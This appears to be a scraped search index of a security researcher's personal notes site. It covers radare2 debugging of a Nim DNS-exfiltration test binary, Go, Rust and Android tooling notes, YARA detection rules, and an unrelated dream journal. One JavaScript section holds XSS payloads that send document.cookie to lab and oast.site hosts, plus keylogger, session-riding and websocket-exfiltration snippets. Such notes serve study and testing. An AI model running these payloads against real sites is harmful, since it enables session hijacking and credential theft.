0x0042c608 1 3599 sym.dnsclient_recordsDatInit000 0x00430f93 1 92 sym.dnsclient_protocolInit000 0x00431f91 1 370 sym.dnsclient_dnsclientDatInit000 [0x00435b55]> db @ 0x00429635 [0x00435b55]> dc ==> Process finished # So basically, this never went to that dnsclient, maybe i can try the other ones, or maybe something is broken before that. (restarted and re-analyzed) [0x7ffad20914d0]> afl |findstr dns 0x00429635 16 2826 sym.dnsclient_typesDatInit000 0x0042c608 1 3599 sym.dnsclient_recordsDatInit000 0x00430f93 1 92 sym.dnsclient_protocolInit000 0x00431f91 1 370 sym.dnsclient_dnsclientDatInit000 [0x7ffad20914d0]> db @ 0x00429635 [0x7ffad20914d0]> db @ 0x0042c608 [0x7ffad20914d0]> db @ 0x00430f93 [0x7ffad20914d0]> db @ 0x00431f91 [0x7ffad20fc47a]> dc hit breakpoint at: 0x429635 [0x00429635]> dbl start end size perm hwsw type state valid cmd cond name module ----------------------------------------------------------------------------------------------------------- 0x00429635 0x00429636 1 --x sw break enabled valid sym.dnsclient_typesDatInit000 0x0042c608 0x0042c609 1 --x sw break enabled valid sym.dnsclient_recordsDatInit000 0x00430f93 0x00430f94 1 --x sw break enabled valid sym.dnsclient_protocolInit000 0x00431f91 0x00431f92 1 --x sw break enabled valid sym.dnsclient_dnsclientDatInit000 [0x00429635]> pdf ; CALL XREF from sym.PreMain @ 0x435a9f ;-- rip: \u250c sym.dnsclient_typesDatInit000(); [0x00429635]> drr role reg value refstr \u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015 mxcsr 0x1f80 8064 rflags 0x204 516 data.00000204,rflags R0 rax 0x45b500 4568320 .bss rax A0 rcx 0x446e00 4484608 IMAGE nsex.exe | .bss .bss rcx ascii ('R W 0x1 A1 rdx 0x42638d 4350861 IMAGE nsex.exe | .text .text Marker_tyRef__OhBa09cfBAnY4MdnNlGabWQ,rdx sym.Marker_tyRef__OhBa09cfBAnY4MdnNlGabWQ R X 'push rbp' 'IMAGE nsex.exe | .text' rbx 0x1 1 rbx,r12 SP rsp 0x67fda8 6815144 PRIVATE rsp R W 0x435aa4 BP rbp 0x67fde0 6815200 PRIVATE rbp R W 0x67fe20 rsi 0x2a 42 rsi ascii ('*') rdi 0xc61570 12981616 PRIVATE rdi R W 0xc61580 A2 r8 0x19c 412 data.0000019c,r8,r9,r10,r11 A3 r9 0x19c 412 data.0000019c,r8,r9,r10,r11 r10 0x19c 412 data.0000019c,r8,r9,r10,r11 r11 0x19c 412 data.0000019c,r8,r9,r10,r11 r12 0x1 1 rbx,r12 r13 0x8 8 r13 r14 0x0 0 r15 0x0 0 PC rip 0x429635 4363829 IMAGE nsex.exe | .text .text dnsclient_typesDatInit000,rip sym.dnsclient_typesDatInit000 R X 'push rbp' 'IMAGE nsex.exe | .text' [0x00429635]> psw @ 0x42638d \u4855\\xee\\x96\\x89\u8348\u30ec\u8948\u104d\u8948\u1855\u8b48\u1045\u8948\\xef\\xa1\\x85\u8b48\\xef\\xa1\\x85\u8b48\u0840\u8b48\u1855\u8948\\xee\\xa3\\x81\u8af6\\xfe\\xff\u8b48\\xef\\xa1\\x85\u8b48\u1840\u8b48\u1855\u8948\\xee\\xa3\\x81\u8ae2\\xfe\\xff\u8b48\\xef\\xa1\\x85\u8b48\u2040\u8b48\u1855\u8948\\xee\\xa3\\x81\u8ace\\xfe\\xff\u8b48\\xef\\xa1\\x85\u8b48\u2840\u8b48\u1855\u8948\\xee\\xa3\\x81\u8aba\\xfe\\xff\u4890\uc483\u5d30\u55c3\u8948\u48e5\u058d\u5179\\x03\uc748\uc800\\x0f\u4800\u058d\u516b\\x03\uc748\u0840\\x08 [0x0042c608]> db @ sym.NimMainModule [0x0042c608]> dbl start end size perm hwsw type state valid cmd cond name module ----------------------------------------------------------------------------------------------------------- 0x00429635 0x00429636 1 --x sw break enabled valid sym.dnsclient_typesDatInit000 0x0042c608 0x0042c609 1 --x sw break enabled valid sym.dnsclient_recordsDatInit000 0x00430f93 0x00430f94 1 --x sw break enabled valid sym.dnsclient_protocolInit000 0x00431f91 0x00431f92 1 --x sw break enabled valid sym.dnsclient_dnsclientDatInit000 0x00435b55 0x00435b56 1 --x sw break enabled valid sym.NimMainModule [0x00431f91]> dc hit breakpoint at: 0x431f91 [0x00431f91]> dbl start end size perm hwsw type state valid cmd cond name module ----------------------------------------------------------------------------------------------------------- 0x00429635 0x00429636 1 --x sw break enabled valid sym.dnsclient_typesDatInit000 0x0042c608 0x0042c609 1 --x sw break enabled valid sym.dnsclient_recordsDatInit000 0x00430f93 0x00430f94 1 --x sw break enabled valid sym.dnsclient_protocolInit000 0x00431f91 0x00431f92 1 --x sw break enabled valid sym.dnsclient_dnsclientDatInit000 0x00435b55 0x00435b56 1 --x sw break enabled valid sym.NimMainModule [0x00431f91]> dc WARNING: A second-chance exception has ocurred! pdf ... \u2502 \u2502\u2502\u254e 0x0043283f mov qword [var_88h], 0x10 ; r8 \u2502 \u2502\u2502\u254e 0x00432847 lea rax, str.usr_local_src_hello.nim ; 0x43c689 ; \"/usr/local/src/hello.nim\" \u2502 \u2502\u2502\u254e 0x0043284e mov qword [var_80h], rax \u2502 \u2502\u2502\u254e 0x00432852 mov rdx, qword [var_50h] \u2502 \u2502\u2502\u254e 0x00432856 mov rax, qword [var_40h] \u2502 \u2502\u2502\u254e 0x0043285a lea rcx, data.00000248 \u2502 \u2502\u2502\u254e 0x00432861 mov qword [var_data.00000268], rcx \u2502 \u2502\u2502\u254e 0x00432866 mov r9d, data.000001f4 ; 0x1f4 \u2502 \u2502\u2502\u254e 0x0043286c mov r8d, 0x10 \u2502 \u2502\u2502\u254e 0x00432872 mov rcx, rax \u2502 \u2502\u2502\u254e ;-- rip: \u2502 \u2502\u2502\u254e 0x00432875 b call sym.sendQuery__CX1XXfck9ba9cJqPY29bYVNeQ ; sym.sendQuery__CX1XXfck9ba9cJqPY29bYVNeQ ... [0x0043286c]> drr; pd 22 role reg value refstr \u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015 mxcsr 0x1f80 8064 rflags 0x204 516 data.00000204,rflags R0 rax 0xa00d10 10489104 PRIVATE rax,rcx R W 0x459c00 A0 rcx 0xa00d10 10489104 PRIVATE rax,rcx R W 0x459c00 A1 rdx 0xa0c520 10536224 PRIVATE rdx R W 0x42 rbx 0x1 1 rbx,r12 SP rsp 0x67f600 6813184 PRIVATE rsp R W 0x67f640 BP rbp 0x67f880 6813824 PRIVATE rbp R W 0x67fdb0 rsi 0x9 9 rsi rdi 0x6b1570 7017840 PRIVATE rdi R W 0x6b1580 A2 r8 0x10 16 r8 A3 r9 0x1f4 500 data.000001f4,r9 r10 0x0 0 r11 0xa0c563 10536291 PRIVATE r11 R W 0x7473616f2e736139 9as.oast.online r12 0x1 1 rbx,r12 r13 0x8 8 r13 r14 0x0 0 r15 0x0 0 PC rip 0x432875 4401269 IMAGE nsex.exe | .text .text rip sym.nsex__eP2ttPkowx6uCkozS0R9aVQ ascii ('u') R X 'call 0x42f578' 'IMAGE nsex.exe | .text' [0x0043286c]> psi @ 0xa0c563 9as.oast.online [0x0043286c]> psi @ 0xa00d10 8.8.8.8 [0x0043286c]> psi @ 0xa0c520 IERPIE5PVCBFRElUIFRI.d0bppvukuj25s86t4750nn63j5i3a19as.oast.online [0x0043286c]> psi @ 0x6b1570 nsex.exe","title":"running 1"},{"location":"Stuff/reference/#running-2","text":"[0x0043e060]> pdf|grep -i softlayer -B1 # listing current function (sym.go.runtime.main) \u2502 \u2502\u254e 0x0043e0fe lea rcx, [0x019423a0] \u2502 \u2502\u254e ; DATA XREF from sym.go.github.com_softlayer_softlayer_go_services.Location_Datacenter.GetLocationStatus @ 0x854af4 -- \u2502 \u2502\u2502\u2502\u254e 0x0043e134 cmp dword [0x019a2f40], 0 ; [0x19a2f40:4]=0 \u2502 \u2502\u2502\u2502\u254e ; DATA XREF from sym.go.github.com_softlayer_softlayer_go_services.Network_Storage.RemoveAccessToReplicantFromVirtualGuestList @ 0x87837e -- \u2502 \u2502\u2502\u2502\u2502\u2502\u2502\u254e 0x0043e2ed mov rax, qword [data.0126bd10] ; [0x126bd10:8]=0xc3f000 sym.go.main.main \u2502 \u2502\u2502\u2502\u2502\u2502\u2502\u254e ; DATA XREF from sym.go.github.ibm.com_SoftLayer_softlayer_cli_plugin_managers.userManager.GetHardware @ 0xa09285 -- \u2502 \u2502\u2502 \u2502\u2502\u2502\u254e 0x0043e31d sub rsp, 0xffffffffffffff80 \u2502 \u2502\u2502 \u2502\u2502\u2502\u254e ; DATA XREF from sym.go.github.ibm.com_SoftLayer_softlayer_cli_plugin_managers.FindVolumePricesUpgrade @ 0x9ff258 [0x0043e060]> agc > /tmp/maincallgraph [0x0043e060]> afl |grep -i search|wc -l 51 ## Decided to scope over to the search features because that's the command line I used [0x004725e0]> db @@F ~softlayer_cli_plugin_commands_search https://github.com/miekg/dns/issues/1384","title":"running 2"},{"location":"Stuff/reference/#dev","text":"","title":"Dev"},{"location":"Stuff/reference/#go","text":"","title":"Go"},{"location":"Stuff/reference/#plugins","text":"First off, you can't use regular elfs as go plugins. But, it seems, there isn't inherently a checker built into the plugins thing yet that prohibits all other elfs (https://cs.opensource.google/go/go/+/refs/tags/go1.24.2:src/plugin/plugin_dlopen.go;l=69) \u250c\u2500\u2500(root\u327fkp2323)-[/share/git-repo/Scripts/gotest/plugintest] \u2514\u2500# cat main.go|grep -i plugin \"plugin\" // Open the plugin plug, err := plugin.Open(\"../../../../../../../../../bin/bash\") log.Fatalf(\"Can't open plugin: %v\", err) // Call the function from the plugin // Access the variable from the plugin fmt.Println(\"Plugin Version:\", *versionVar) \u250c\u2500\u2500(root\u327fkp2323)-[/share/git-repo/Scripts/gotest/plugintest] \u2514\u2500# go run main.go 2025/05/01 15:05:05 Can't open plugin: plugin.Open(\"../../../../../../../../../bin/bash\"): /usr/bin/bash: cannot dynamically load position-independent executable exit status 1","title":"plugins"},{"location":"Stuff/reference/#nim","text":"","title":"nim"},{"location":"Stuff/reference/#docker-compile","text":"docker run --rm -v `pwd`:/usr/local/src chrishellerappsian/docker-nim-cross:latest bash -c \"nimble install -y dnsclient; nim c --os:windows --cpu:amd64 --out:nsex.exe hello.nim\"","title":"docker compile"},{"location":"Stuff/reference/#related-projects","text":"offensivenim nimcrypt2 nimplant nimpackt dinvoke -> nim_dinvoke nimfilt","title":"related projects"},{"location":"Stuff/reference/#rust","text":"","title":"rust"},{"location":"Stuff/reference/#create-txt-request","text":"use trust_dns_resolver::error::ResolveResult; use trust_dns_resolver::Resolver; use trust_dns_resolver::{config::*, lookup::TxtLookup} fn main(){ let resolver = Resolver::new(ResolverConfig::default(), ResolverOpts::default()).unwrap(); let txt_respons = resolver.txt_lookup(\"whatever.whatever.tld\"); display_txt(&txt_response);_ } fn display_txt(txt_response: &ResolveResult<TxtLookup){ match txt_response{ Err(_)=>println!(\"No TXT Records\"), Ok(txt_response)=>{ let mut i = 1; for record in txt_response.iter(){ println!(\"TXT Record {}:\", i); println!(\"{}\" record.to_string()); println!(\"\"); i=i+1 } } } }","title":"create txt request"},{"location":"Stuff/reference/#base64","text":"use base64::prelude::*; let input=b'whatever' let encoded=BASE64_STANDARD.encode(input);","title":"base64"},{"location":"Stuff/reference/#reading-a-file","text":"use std::env; use std::fs; fn main(){ println!(\"in file {file_path}\"); let contents=fs::read_to_string(file_path).expect(\"you should have been able to read the file!); println!(\"With text:\\n{contents}\") }","title":"reading a file"},{"location":"Stuff/reference/#home-dir","text":"usr std::env; match env::home_dir(){ Some(path)=>println!(\"your home directory {}\", path.display()), None=>println!(\"impossible to get your home dir\"), }","title":"home dir"},{"location":"Stuff/reference/#pyscript","text":"","title":"pyscript"},{"location":"Stuff/reference/#just-some-testing-to-understand-it","text":"<div w3-include-html=\"https://ferasdour.pyscriptapps.com/silent-math/latest/?url=https://ffpi86cvy1zmtg0bs49m3ki72w1t4pbc9.oast.site\"></div> <script src='https://ferasdour.pyscriptapps.com/silent-math/latest/whatever.js'></script> <img src=\"xsspoc\" onerror=\"import('https://ferasdour.pyscriptapps.com/evil-poc-dont-use/latest/whatever.js');\"> More info on this is over here: https://pyscript.com/@ferasdour/evil-poc-dont-use/latest?files=README.md , https://github.com/ferasdour/other-nonsense , and https://feemcotech.blogspot.com/2025/05/pyscript-nim-aaaaand-go.html","title":"Just some testing, to understand it"},{"location":"Stuff/reference/#quick-devops-spinup","text":"mkdir /volume1/Data/jenkins docker run -p 10080:8080 -v /volume1/Data/jenkins:/var/jenkins_home jenkins/jenkins:lts mkdir /volume1/Data/gogs docker run --name=gogs -p 10022:22 -p 10880:3000 -v /var/gogs:/data gogs/gogs","title":"Quick devops spinup"},{"location":"Stuff/reference/#android","text":"","title":"Android"},{"location":"Stuff/reference/#install-from-apk","text":"PS C:\\Users\\no_ne\\Desktop> ..\\appdata\\Local\\Android\\Sdk\\platform-tools\\adb.exe install metaview.apk","title":"Install from apk"},{"location":"Stuff/reference/#install-ca","text":"openssl x509 -inform PEM -subject_hash_old -in ca-docker.crt|head -n 1 ce01745e openssl x509 -in ca-docker.crt -inform PEM -outform DER -out ce01745e.0 # on adb system ..\\appdata\\Local\\Android\\Sdk\\platform-tools\\adb.exe push .\\certs\\ce01745e.0 /data/misc/user/0/cacerts-added/ce01745e.0 ..\\appdata\\Local\\Android\\Sdk\\platform-tools\\adb shell \"su 0 chmod 644 /data/misc/user/0/cacerts-added/ce01745e.0\" ..\\appdata\\Local\\Android\\Sdk\\platform-tools\\adb reboot","title":"Install CA"},{"location":"Stuff/reference/#install-frida","text":"unxz frida-server.xz adb root ..\\appdata\\Local\\Android\\Sdk\\platform-tools\\adb push .\\frida-server-16.6.6-android-x86_64 /data/local/tmp/ ..\\appdata\\Local\\Android\\Sdk\\platform-tools\\adb shell \"chmod 755 /data/local/tmp/frida-server-16.6.6-android-x86_64 ..\\appdata\\Local\\Android\\Sdk\\platform-tools\\adb shell \"chmod 755 /data/local/tmp/frida-server-16.6.6-android-x86_64\" ..\\appdata\\Local\\Android\\Sdk\\platform-tools\\adb shell \"/data/local/tmp/frida-server-16.6.6-android-x86_64 &\"","title":"Install Frida"},{"location":"Stuff/reference/#adb-networked","text":"taskkill /f /t /im adb.exe .\\adb.exe -a nodaemon server","title":"Adb networked"},{"location":"Stuff/reference/#javascript-mostly-from-tcms-course","text":"","title":"javascript (mostly from tcm's course)"},{"location":"Stuff/reference/#notes","text":"apis: - requests: - fetch - fetch(\"https://google.com\") - xmlhttp - let xhr = new XMLHttpRequest(); xrh.open('GET','https://google.com',true); xhr.send('email=update@email.com')","title":"notes"},{"location":"Stuff/reference/#stealing-cookies","text":"<img src=\"http://10.10.14.13?c='+document.cookie+'\"/> <img src=x onerror='fetch(\"http://cvo169ukuj238mr1ikegi59khk1ww9rzc.oast.site/?auth=\"+document.cookie)';/> fetch(\"http://locahost/?c=\"+document.cookie);","title":"Stealing Cookies:"},{"location":"Stuff/reference/#accessing-storage","text":"let localStorageData=JSON.stringify(localStorage) let sessionStorageData=JSON.stringify(sessionStorage)","title":"Accessing storage:"},{"location":"Stuff/reference/#saved-creds-autofill-and-export","text":"// create the input elements let userField=document.createElement('input'); userField.Type=\"text\"; UserField.name=\"username\"; UserField.id=\"username\"; let passField = document.createElement('input'); passField.type=\"password\"; passField.name=\"password\"; passField.id=\"password\"; // append the elements tot he body of the page document.body.appendChild(userField); document.body.appendChild(passField); // exfiltrate as needed setTimeout(function(){ console.log(\"Username:\", document.getElementById(\"username\").value); console.log(\"Username:\", document.getElementById(\"username\").value); }, 1000);","title":"Saved Creds (autofill and export):"},{"location":"Stuff/reference/#session-riding","text":"let xhr = new XMLHttpRequest(); xhr.open('POST','http://localhost/updateprofile',true); xhr.setRequestHeader('Content-type'.'application/x-www-form-urlencoded'); xhr.send('?email=update@email.com');","title":"Session Riding:"},{"location":"Stuff/reference/#keylogger","text":"document.onkeypress=function(e){ get=window.event ? event: e; key=get.keyCode ? get.keyCode : get.charCode; key=String.fromCharCode(key); console.log(key); }","title":"Keylogger:"},{"location":"Stuff/reference/#example-using-this-to-get-admin","text":"<script>fetch('https://10.10.14.13/',{method: 'POST', mode: 'no-cors', body: document.cookie,});</script>","title":"example using this to get admin:"},{"location":"Stuff/reference/#websocket-example","text":"<script> var ws=new Websocket('wss://target.local/page'); ws.onopen=function(){ws.send(\"READY\");} ws.onmessage=function (event) {fetch('https://colab-payload.local',{method:\"POST\",mode:\"no-cors\",body:event.data});} </script>","title":"Websocket example:"},{"location":"Stuff/reference/#port-scanning-defanged-example","text":"const listing=[];listing.forEach((domain) => {Array.from([\"80\",\"8080\",\"443\",\"8443\",\"10000\",\"22\",\"2222\",\"88\",\"5789\"]).forEach(port => {try{fetch('http://'+domain+':'+port,{method: 'POST', mode: 'no-cors',body: document.cookie,}).then(data => {obj = data;});fetch('WHATEVER',{method: 'POST', mode: 'no-cors', body: obj,}); new Promise(r => setTimeout(r, 2000));} catch(error){}});});","title":"Port scanning (defanged example):"},{"location":"Stuff/reference/#launch-powershell-web","text":"opening folders with explorer but choosing powershell, lauches powershell . old ways https://devblogs.microsoft.com/scripting/how-can-i-start-windows-explorer-opened-to-a-specific-folder/ Maybe - objShell.BrowseForFolder _ (WINDOW_HANDLE, \u201cSelect a folder:\u201d, NO_OPTIONS, \"powershell -iex 'start cmd.exe'\") . https://learn.microsoft.com/en-us/windows/win32/shell/shell-browseforfolder (activex objects in javascript don't work anymore except for ie and such so might have to rely on vbs or wasm) . This has apparently been a thing for a while https://stackoverflow.com/questions/33746534/vbscript-open-folder-in-same-explorer-window . Here's an example where they also add to make it send enter to forward it: Set WshShell = WScript.CreateObject(\"WScript.Shell\") target = \"powershell -iex 'start cmd.exe'\" WshShell.SendKeys \"%d\" WshShell.SendKeys target WshShell.SendKeys \"{ENTER}\" . remote share by specifically launching wscript.shell.run: Set WshShell = WScript.CreateObject(\"WScript.Shell\") WshShell.Run \"Explorer \" & \"\\\\MachineName\\Path\\\", 1, false wscript.Sleep 10000 WshShell.Run \"Explorer \" & \"C:\\Users\\UserName\\Desktop\", 1, false . None of those work outside of ie context, or some cases with edge (chromium) . https://developer.mozilla.org/en-US/docs/Web/API/Navigator/share#examples web share api seems to have a file option . https://developer.mozilla.org/en-US/docs/Web/API/File/File . example (unrelated) of file use const file = new File([\"https://d016rj6kuj25cl9fe7l0bykqdyuotcn98.oast.online\"], \"foo.lnk\", {type: \"text/uri-list\",}); await navigator.share({file, title: \"test\", text: \"test\", url: ''}); await navigator.share({title: 'test',text: 'test',url: 'https://d016rj6kuj25cl9fe7l0bykqdyuotcn98.oast.online',}); # click the button by default document.getElementsByTagName('button')[0].click(); # example javascript let shareData = { title: 'MDN', text: 'Learn web development on MDN!', url: 'https://d016rj6kuj25cl9fe7l0bykqdyuotcn98.oast.online', }; const btn = document.querySelector('button'); const resultPara = document.querySelector('.result'); btn.addEventListener('click', () => { if (!navigator.canShare) { resultPara.textContent = 'Web Share API not available'; return; } if (!navigator.canShare(shareData)) { resultPara.textContent = 'Share data unsupported, disallowed, or invalid'; return; }","title":"launch powershell web"},{"location":"Stuff/reference/#detection","text":"","title":"Detection"},{"location":"Stuff/reference/#phishing-kits-yara-rule","text":"(found inside open buckets) rule phishingKits3 { meta: description = \"PhishingKits3\" author = \"ferasdour\" strings: $s1 = \"https://ajax.googleapis.com/ajax/libs/jquery/\" ascii $s2 = \"https://code.jquery.com/jquery-\" ascii $s3 = \"window.location.hash.substr(\" ascii $s4 = \".substr((\" ascii $s5 = \").click(function(event\" ascii $s6 = \"Please try again later\" ascii $r1 = /url:(\\s)\\Shttps:\\/\\/.[a-zA-Z0-9-_.]{6,200}/is $r2 = /type:(\\s|\\s')POST',/is $s7 = \"email:\" ascii $s8 = \"password:\" ascii $s9 = \"btn').html('\" ascii // $header = { (0d 0a | 20 0d 0a 0d 0a | 3c 21 44) } condition: any of ($*) }","title":"phishing kits yara rule"},{"location":"Stuff/reference/#ibm-cloud-api-key-yara-rule","text":"(finds some false positives, but substantially less than any other method I've found) rule cloudApiKeyRule { meta: name = \"ibmcloud key\" author = \"ferasdour\" notes = \"just used grep -Praho with these set together with or operator\" strings: $ibmApiKey = /\\\"[A-Za-z0-9]{5,25}\\d[A-Za-z0-9]{5,20}[\\_][A-Za-z0-9]{5,25}\\\"/ $ibmApiKey2 = /(\\s[A-Za-z0-9]{5,25}\\d[A-Za-z0-9]{5,20}[\\_][A-Za-z0-9]{5,25})/ $ibmApiKey3 = /([A-Za-z0-9]{5,25}\\d[A-Za-z0-9]{5,20}[\\_][A-Za-z0-9]{5,25})/ condition: // I have keys that are both 44 and 63 chars, truffle detects the 44 char, and terraform says its 63 limit, so lets just assume both. 46 to accomodate the quoted version ($ibmApiKey and (!ibmApiKey == 46 or !ibmApiKey == 64)) or ($ibmApiKey2 and (!ibmApiKey2 == 44 or !ibmApiKey2 == 63)) or // adding this one as a \"with nothing added or surrounding the detection\" for binary cases, comment out if not needed. ($ibmApiKey3 and (!ibmApiKey3 == 44 or !ibmApiKey3 == 63)) }","title":"IBM Cloud API key yara rule"},{"location":"Stuff/reference/#ibmcloud-cli-config-file","text":"rule ibmcloudconfig: CLOUD_CONFIG_FILE { meta: description = \"Search specifically for bearer token left in file from ibmcloud cli, including plugins\" author = \"ferasdour\" strings: $s1 = \"IAMToken\" $s2 = \"IAMRefreshToken\" $s3 = \"cloud.ibm.com\" $h1 = { 7b 0a 20 20 } condition: $h1 at 0 and all of ($s1, $s2, $s3)","title":"IBMCloud cli config file"},{"location":"Stuff/weird-dreams/","text":"My wife has been telling me for some time now I should document some of my dreams. So I thought I'd add some backdated dreams, then start adding these as I'm able to. Dreams Interesting game Had a dream about a game that's played roughly like battleship, but with multiple layers of 9x9 grids. Challenge is, you can only see the top-most row in any spot. You then are given, at random, coins with letters on them. Those coins, you have to guess where the letter is on any of the boards. If you run into a bomb, it destroys the space and makes it un-usable at all levels. You get points only for completed words. if you guess T on row 3 column 3, and T is the middle character, you get a point for that being there, and people can still guess above or below in that same area. If there isn't a T there, but a bomb on the 3rd layer, you and everyone who has already placed in that spot, lose that spot as being available. on a 3x(9x9) board, bombs 6 total will be scattered amongst the layers. Death gates As much as I can remember, there was this girl who was looking through a house (I guess with family) and saw there was a sweater. She moved the sweater onto the chair in a way that it couldn't easily be removed and walked out of the room. Then waited for it to be picked up. At which point a dead guy was trying to grab his sweater for the afterworld. She understood what he was doing and helped unhook it. Then I was the girl and I was with him to try to find the correct portal to move on through. These portals started popping out of the ground as we approached. We saw the first one, very typical stone door way, nothing exactly special but very classic \"gateway to afterlife\" thing. Then, we saw the next one, a little spookier, a little more scary but still stone and still staying still. Why do I word it like that? well then comes number 3, a walking... er... crawling... stone gateway. Then next one was like a dragon with it's mouth being the gateway. But like, where it could move but slowly and kinda hindered. Then there was the last one. This was much larger, much scarier dragon. Which immediately started chasing us. I figured we'd go to this tall building and go to the higher floors to try to outrun it. The guy said something about some sort of harry potter sounding cloak that could stop us from not just being seen but our presence erased. After running and hauling ass and trying to get there before being gobbled up by this demon portal... it just stopped. I was no longer in this dream it seemed. I was outside of it all, debating if this was the better path or if we should have headed back to the original house. Then suddenly, I realized what had happened. He put the cloak on me and sacrificed himself. Old dreams Just wanted to write some ones I remember that were somewhat important. Lucifer arrives from my couch This was exactly as it sounds, when I was like 10 had a dream where the devil and all the demons came from our couch. I watched as they slaughtered everyone around us. I went to lucifer, as we were spared because we inadvertently summoned him, and requested that they spare my friends and their families as well. Can't recall what he said, but he spoke roughly like \"him\" from powerpuff girls. This was before that show came out. Dream of dog dying as he was dying Slept on the couch one night as a kid. Had a dream about our dog toaster, trying to tell me things were going to be okay. Woke up to him dead at my feet. Dream of pops dying Had a dream my grandfather was dying. I don't recall how close it was to when he died, but it was close enough I remember it seemingly next day. This was also a childhood dream. Dream my former friend got attacked A few years back, before I met my wife, had a dream of a friend that I had a falling out with (a few years even before this dream) being attacked and calling for help. Talked to a mutual friend of ours about it, who explained that night the former friend got forced to do some stuff when she didn't want to. Head rolling dream I know this one is kind of a trope because everyone has these, but I had a dream as a kid of being decapitated. In doing so, I stayed present in my head enough to see my body drop. I don't currently remember but more about it, but if I remember i'll update this.","title":"Weird Dreams"},{"location":"Stuff/weird-dreams/#dreams","text":"","title":"Dreams"},{"location":"Stuff/weird-dreams/#interesting-game","text":"Had a dream about a game that's played roughly like battleship, but with multiple layers of 9x9 grids. Challenge is, you can only see the top-most row in any spot. You then are given, at random, coins with letters on them. Those coins, you have to guess where the letter is on any of the boards. If you run into a bomb, it destroys the space and makes it un-usable at all levels. You get points only for completed words. if you guess T on row 3 column 3, and T is the middle character, you get a point for that being there, and people can still guess above or below in that same area. If there isn't a T there, but a bomb on the 3rd layer, you and everyone who has already placed in that spot, lose that spot as being available. on a 3x(9x9) board, bombs 6 total will be scattered amongst the layers.","title":"Interesting game"},{"location":"Stuff/weird-dreams/#death-gates","text":"As much as I can remember, there was this girl who was looking through a house (I guess with family) and saw there was a sweater. She moved the sweater onto the chair in a way that it couldn't easily be removed and walked out of the room. Then waited for it to be picked up. At which point a dead guy was trying to grab his sweater for the afterworld. She understood what he was doing and helped unhook it. Then I was the girl and I was with him to try to find the correct portal to move on through. These portals started popping out of the ground as we approached. We saw the first one, very typical stone door way, nothing exactly special but very classic \"gateway to afterlife\" thing. Then, we saw the next one, a little spookier, a little more scary but still stone and still staying still. Why do I word it like that? well then comes number 3, a walking... er... crawling... stone gateway. Then next one was like a dragon with it's mouth being the gateway. But like, where it could move but slowly and kinda hindered. Then there was the last one. This was much larger, much scarier dragon. Which immediately started chasing us. I figured we'd go to this tall building and go to the higher floors to try to outrun it. The guy said something about some sort of harry potter sounding cloak that could stop us from not just being seen but our presence erased. After running and hauling ass and trying to get there before being gobbled up by this demon portal... it just stopped. I was no longer in this dream it seemed. I was outside of it all, debating if this was the better path or if we should have headed back to the original house. Then suddenly, I realized what had happened. He put the cloak on me and sacrificed himself.","title":"Death gates"},{"location":"Stuff/weird-dreams/#old-dreams","text":"Just wanted to write some ones I remember that were somewhat important.","title":"Old dreams"},{"location":"Stuff/weird-dreams/#lucifer-arrives-from-my-couch","text":"This was exactly as it sounds, when I was like 10 had a dream where the devil and all the demons came from our couch. I watched as they slaughtered everyone around us. I went to lucifer, as we were spared because we inadvertently summoned him, and requested that they spare my friends and their families as well. Can't recall what he said, but he spoke roughly like \"him\" from powerpuff girls. This was before that show came out.","title":"Lucifer arrives from my couch"},{"location":"Stuff/weird-dreams/#dream-of-dog-dying-as-he-was-dying","text":"Slept on the couch one night as a kid. Had a dream about our dog toaster, trying to tell me things were going to be okay. Woke up to him dead at my feet.","title":"Dream of dog dying as he was dying"},{"location":"Stuff/weird-dreams/#dream-of-pops-dying","text":"Had a dream my grandfather was dying. I don't recall how close it was to when he died, but it was close enough I remember it seemingly next day. This was also a childhood dream.","title":"Dream of pops dying"},{"location":"Stuff/weird-dreams/#dream-my-former-friend-got-attacked","text":"A few years back, before I met my wife, had a dream of a friend that I had a falling out with (a few years even before this dream) being attacked and calling for help. Talked to a mutual friend of ours about it, who 